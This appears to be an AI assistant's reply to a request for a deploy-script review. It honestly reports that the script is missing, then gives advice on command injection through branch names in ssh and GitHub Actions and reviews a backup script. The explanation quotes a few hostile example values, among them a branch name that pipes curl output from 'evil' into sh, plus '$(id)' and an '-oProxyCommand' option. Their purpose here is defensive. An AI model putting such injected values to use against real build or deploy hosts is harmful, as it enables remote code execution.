I couldn't find the script you described. Nothing in this workspace builds an ssh command from a branch name. A case-insensitive search for `ssh` matched no files. The only shell-related files are:

- `.github/workflows/deploy.yml`: one `run:` step that echoes the PR title. It has no ssh and no branch name.
- `scripts/backup.sh`: a nightly backup that uses `scp`, not ssh with a branch.

Could you point me to the file, or push it? It may be on another branch or not committed yet. I haven't run `shellcheck` or `bash -n` on anything, because I don't have a shell in this session.

## What I'd check in the deploy script

Passing a branch name inside the ssh command string is a command-injection bug. The remote side runs whatever command string it receives through a shell, and quoting it locally doesn't stop that. Anyone who can name a branch can run code on the deploy host. Git allows branch names like `` x;curl${IFS}evil|sh `` or `$(id)`.

The fix:
1. **Check the branch name against an allowlist at the start, and reject it if it fails**:
   ```bash
   if [[ ! ${branch} =~ ^[A-Za-z0-9][A-Za-z0-9._/-]{0,99}$ ]] || [[ ${branch} == *..* ]]; then
     printf 'invalid branch: %q\n' "${branch}" >&2; exit 2
   fi
   ```
2. **Don't paste it into the remote command.** Either:
   - Run a fixed script on the remote and send the branch on stdin: `printf '%s\n' "${branch}" | ssh -- "${host}" /opt/deploy/deploy.sh`. The remote script reads it with `read -r branch` and checks it again.
   - Or, if you need to pass it as an argument, escape it with `printf -v q '%q' "${branch}"; ssh -- "${host}" "/opt/deploy/deploy.sh ${q}"`. This only works if the remote login shell is Bash. Keep the allowlist check in front of it.
3. Use `--` before the host, and check the host against an allowlist too, so a value like `-oProxyCommand=…` can't be read as an option.
4. In CI, get the branch through `env:` (`BRANCH: ${{ github.head_ref }}`) and refer to it as `"${BRANCH}"`. Never write `${{ … }}` directly inside `run:`.

## Problems in the files that do exist

**`deploy.yml` (fix before CI uses it):**
- Line 14: `${{ github.event.pull_request.title }}` is pasted straight into the shell. Anyone who opens a PR can run commands on the runner just by choosing the PR title. Move it into `env:` and use `"${TITLE}"` instead.
- Line 7: `permissions: write-all` on a `pull_request` trigger gives that injected code a write token. Reduce it to `contents: read`.

**`scripts/backup.sh`:**
- It has no `set -Eeuo pipefail`. If `tar` fails, `scp` still runs and uploads a broken or missing archive.
- `/tmp/backup.$$` is a predictable name, so someone else on the machine can create it first (or a symlink there). Use `mktemp -d` instead.
- Nothing cleans up the temp directory if the script stops partway. Set `trap … EXIT` before creating it.
- Variables aren't quoted, and it uses backticks instead of `$(…)`.
- It runs from cron but doesn't set its own `PATH` or `umask`.

Once you share the deploy script, I'll review it properly and run `shellcheck`, `bash -n`, and a failure-path test if you give me a shell.
